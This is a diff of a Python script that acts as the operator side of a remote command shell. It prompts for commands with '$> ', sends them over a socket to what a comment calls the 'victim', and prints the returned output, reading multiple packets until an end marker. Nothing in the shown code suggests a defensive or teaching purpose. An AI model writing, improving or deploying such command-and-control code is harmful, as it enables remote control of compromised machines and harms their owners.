@@ -1,10 +1,12 @@
 #!/usr/bin/env python
 from socket import*
+from sys import stdout
 
 try:
     input = raw_input
 except:
     pass
+
 
 def fuzz_den(meth):
     for encode in ("utf-8", "gbk", "iso8859-1"):
@@ -13,25 +15,41 @@ def fuzz_den(meth):
         except Exception:
             continue
 
-NORESP = b"\xff"
-E = lambda I: fuzz_den(I.encode)
-D = lambda I: fuzz_den(I.decode)
 
-def enter_console(C):
-    S, R = C.send, C.recv
-    while 6:
+def enter_console(sock):
+    S, R = sock.send, sock.recv
+    STREAM_END_SIG = b"\x00\x00"
+    E = lambda I: fuzz_den(I.encode)
+    D = lambda I: fuzz_den(I.decode)
+    puts = lambda s: stdout.write(s)
+    while True:
         inputs = input("$> ")
+        if len(inputs) <= 0:
+            continue
+        if inputs == "quit":
+            exit(0)
         if inputs == "exit":
             break
+        # send to victim's
         if S(E(inputs)) == 0:
-            continue
-        resp = R(4096*2)
-        if resp != NORESP:
-            print(D(resp))
-        else:
-            print("$> !")
+            break
 
-    C.close()
+        packets = 0
+        while True:
+            resp = R(1024)
+            packets += 1
+            if packets == 1 and resp == STREAM_END_SIG:
+                puts("$> !\n")
+                break
+
+            if STREAM_END_SIG in resp:
+                puts(D(resp[:-2]))
+                break
+
+            puts(D(resp))
+
+    sock.close()
+
 
 def server(h, p):
     sock = socket(AF_INET, SOCK_STREAM)
